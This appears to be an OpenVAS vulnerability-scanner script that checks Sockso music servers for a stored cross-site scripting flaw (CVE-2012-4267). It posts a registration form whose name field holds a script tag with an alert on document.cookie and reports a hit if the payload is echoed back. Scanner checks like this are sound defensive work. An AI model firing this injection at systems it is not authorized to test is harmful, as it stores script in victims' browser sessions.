###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sockso_registration_persistent_xss_vuln.nasl 11430 2018-09-17 10:16:03Z cfischer $
#
# Sockso Registration Persistent Cross Site Scripting Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802853");
  script_version("$Revision: 11430 $");
  script_cve_id("CVE-2012-4267");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-09-17 12:16:03 +0200 (Mon, 17 Sep 2018) $");
  script_tag(name:"creation_date", value:"2012-05-14 13:06:50 +0530 (Mon, 14 May 2012)");
  script_name("Sockso Registration Persistent Cross Site Scripting Vulnerability");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18868");
  script_xref(name:"URL", value:"http://smwyg.com/blog/#sockso-persistant-xss-attack");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/112647/sockso-xss.txt");

  script_category(ACT_DESTRUCTIVE_ATTACK); # Stored XSS
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 4444);
  script_mandatory_keys("Sockso/banner");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert
  arbitrary HTML and script code, which will be executed in a user's browser
  session in the context of an affected site.");
  script_tag(name:"affected", value:"Sockso version 1.51 and prior");
  script_tag(name:"insight", value:"The flaw is due to improper validation of user supplied input
  via the 'name' parameter to user or register.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"The host is running Sockso and is prone to persistent cross site
  scripting vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:4444);

banner = get_http_banner(port: port);
if(!banner || "Server: Sockso" >!< banner){
  exit(0);
}

url = "/user/register";
postdata = "todo=register&name="+ rand() + "<script>alert(document.cookie)" +
           "</script>&pass1=abc&pass2=abc&email=xyz"+ rand() +"%40gmail.com";

req = http_post(item:url, port:port, data:postdata);

res = http_keepalive_send_recv(port:port, data:req);

if(res && res =~ "HTTP/1\.[0-9]+ 200" &&
   "<title>Sockso" >< res &&
   "<script>alert(document.cookie)</script>" >< res){
  report = report_vuln_url( port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
